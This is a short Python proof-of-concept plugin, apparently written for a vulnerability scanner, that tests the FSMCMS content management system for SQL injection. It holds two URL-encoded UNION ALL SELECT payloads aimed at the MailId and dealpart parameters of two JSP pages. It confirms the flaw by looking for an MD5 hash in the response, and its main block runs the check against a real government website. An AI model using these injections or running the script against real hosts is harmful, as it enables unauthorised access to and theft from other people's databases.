#!/usr/bin/env python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://www.wooyun.org/bugs/wooyun-2010-065204
#ref http://www.wooyun.org/bugs/wooyun-2010-065148

def assign(service, arg):
    if service == "fsmcms":
        return True, arg


def audit(arg):
    
    payloads = ['cms/leadermail/p_replydetail.jsp?MailId=-1%27%20UNION%20ALL%20SELECT%20NULL%2cNULL%2cNULL%2cNULL%2cmd5%280x22%29%2cNULL--%20'\
    ,'cms/leadermail/p_leadermailsum.jsp?dealpart=-1%27%20UNION%20ALL%20SELECT%20NULL%2cmd5%280x22%29--%20&year=2011']
    for payload in payloads:
        url = arg + payload
        code, head,res, errcode, _ = curl.curl2(url)

        if 'b15835f133ff2e27c7cb28117bfae8f4' in res:
            security_hole(url)

                        
if __name__ == '__main__':
    from dummy import *
    
    audit(assign('fsmcms', 'http://xfj.wuhai.gov.cn/')[1])